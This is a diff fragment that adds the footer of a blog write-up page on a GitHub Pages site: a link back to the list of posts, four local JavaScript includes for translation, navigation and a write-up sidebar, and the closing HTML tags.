+  <span><a href="https://sp1r4.github.io/blog.html">← All posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
